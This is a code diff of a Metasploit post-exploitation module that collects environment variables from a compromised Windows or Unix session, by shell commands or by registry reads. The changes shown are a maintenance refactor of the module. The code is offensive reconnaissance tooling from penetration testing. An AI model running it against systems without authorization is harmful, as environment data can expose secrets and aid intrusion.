@@ -1,12 +1,12 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 require 'rex'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
 
   include Msf::Post::Windows::Registry
 
@@ -35,28 +35,27 @@ class Metasploit3 < Msf::Post
 
   def get_env_shell
     print_line @output if @output
-    if session.platform =~ /win/
+    if session.platform == 'windows'
       @ltype = "windows.environment"
       cmd = "set"
     else
       @ltype = "unix.environment"
       cmd = "env"
     end
-    @output = session.shell_command_token(cmd)
+    @output = cmd_exec(cmd)
   end
 
   def get_env_meterpreter
-    case sysinfo["OS"]
-    when /windows/i
+    case session.platform
+    when 'windows'
       var_names = []
       var_names << registry_enumvals("HKEY_CURRENT_USER\\Volatile Environment")
       var_names << registry_enumvals("HKEY_CURRENT_USER\\Environment")
       var_names << registry_enumvals("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment")
       output = []
       var_names.delete(nil)
-      var_names.flatten.uniq.sort.each do |v|
-        # Emulate the output of set and env, e.g. VAR=VALUE
-        output << "#{v}=#{session.fs.file.expand_path("\%#{v}\%")}"
+      session.sys.config.getenvs(*var_names.flatten.uniq.sort).each do |k, v|
+        output << "#{k}=#{v}"
       end
       @output = output.join("\n")
       @ltype = "windows.environment"
